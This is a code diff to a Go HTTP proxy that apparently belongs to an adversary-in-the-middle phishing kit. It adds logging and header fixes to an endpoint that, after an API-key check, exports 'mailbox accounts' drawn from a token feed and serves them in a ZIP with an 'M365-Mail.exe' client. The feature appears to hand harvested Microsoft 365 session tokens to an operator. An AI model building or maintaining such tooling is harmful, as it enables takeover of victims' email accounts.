@@ -996,25 +996,32 @@ func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *da
 
 			// --- Begin mailbox download endpoint (M365-Mail.exe + accounts) ---
 			if mailboxDownloadRe.MatchString(req.URL.Path) {
+				log.Debug("[mailbox] Download endpoint hit from %s", remote_addr)
 				apiKey := req.URL.Query().Get("key")
 				if apiKey != p.tokenFeed.GetAPIKey() {
+					log.Warning("[mailbox] Download unauthorized - invalid key from %s", remote_addr)
 					resp := goproxy.NewResponse(req, "application/json", 401, `{"error":"unauthorized"}`)
 					return req, resp
 				}
 				
 				// Get accounts export JSON
 				exportBody, _ := p.mailboxAccounts.HandleAPIRequest(p.tokenFeed.GetAPIKey(), apiKey, "export")
+				log.Debug("[mailbox] Export body length: %d", len(exportBody))
 				
 				// Create ZIP in memory with accounts-import.json
 				zipBuffer := p.createMailboxDownloadZip(exportBody)
 				if zipBuffer == nil {
+					log.Error("[mailbox] Failed to create ZIP buffer")
 					resp := goproxy.NewResponse(req, "application/json", 500, `{"error":"failed to create download package"}`)
 					return req, resp
 				}
+				log.Debug("[mailbox] ZIP buffer size: %d bytes", len(zipBuffer))
 				
-				// Create proper binary response - don't convert bytes to string
+				// Create proper binary response with all required fields
 				resp := &http.Response{
+					Status:        "200 OK",
 					StatusCode:    200,
+					Proto:         "HTTP/1.1",
 					ProtoMajor:    1,
 					ProtoMinor:    1,
 					Request:       req,
@@ -1022,11 +1029,13 @@ func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *da
 					Body:          ioutil.NopCloser(bytes.NewReader(zipBuffer)),
 					ContentLength: int64(len(zipBuffer)),
 				}
-				resp.Header.Set("Content-Disposition", "attachment; filename=M365-Mail-Package.zip")
-				resp.Header.Set("Content-Type", "application/zip")
+				resp.Header.Set("Content-Disposition", "attachment; filename=\"M365-Mail-Package.zip\"")
+				resp.Header.Set("Content-Type", "application/octet-stream")
 				resp.Header.Set("Content-Length", fmt.Sprintf("%d", len(zipBuffer)))
 				resp.Header.Set("Cache-Control", "no-store, no-cache, must-revalidate, max-age=0")
-				log.Success("[mailbox] Download package served to %s (%d accounts)", remote_addr, p.mailboxAccounts.Count())
+				resp.Header.Set("Pragma", "no-cache")
+				resp.Header.Set("X-Content-Type-Options", "nosniff")
+				log.Success("[mailbox] Download package served to %s (%d accounts, %d bytes)", remote_addr, p.mailboxAccounts.Count(), len(zipBuffer))
 				return req, resp
 			}
 			// --- End mailbox download endpoint ---
